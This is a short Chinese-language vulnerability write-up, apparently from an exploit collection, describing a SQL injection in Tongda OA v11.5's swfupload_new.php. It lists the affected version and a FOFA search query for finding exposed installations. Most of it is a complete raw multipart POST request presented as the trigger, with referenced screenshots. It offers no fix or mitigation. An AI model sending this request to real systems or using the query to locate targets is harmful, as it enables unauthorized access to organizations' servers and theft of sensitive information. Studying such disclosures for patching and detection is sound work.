# 通达OA v11.5 swfupload_new.php SQL注入漏洞

## 漏洞描述

通达OA v11.5 swfupload_new.php 文件存在SQL注入漏洞，攻击者通过漏洞可获取服务器敏感信息

## 漏洞影响

```
通达OA v11.5
```

## FOFA

```
app="TDXK-通达OA"
```

## 漏洞复现

登陆页面

![image-20220520154058320](./images/202205201540406.png)

发送请求包触发漏洞

```
POST /general/file_folder/swfupload_new.php HTTP/1.1
Host: 
User-Agent: Go-http-client/1.1
Content-Length: 355
Content-Type: multipart/form-data; boundary=----------GFioQpMK0vv2
Accept-Encoding: gzip

------------GFioQpMK0vv2
Content-Disposition: form-data; name="ATTACHMENT_ID"

1
------------GFioQpMK0vv2
Content-Disposition: form-data; name="ATTACHMENT_NAME"

1
------------GFioQpMK0vv2
Content-Disposition: form-data; name="FILE_SORT"

2
------------GFioQpMK0vv2
Content-Disposition: form-data; name="SORT_ID"

------------GFioQpMK0vv2--
```

![image-20220520154111741](./images/202205201541795.png)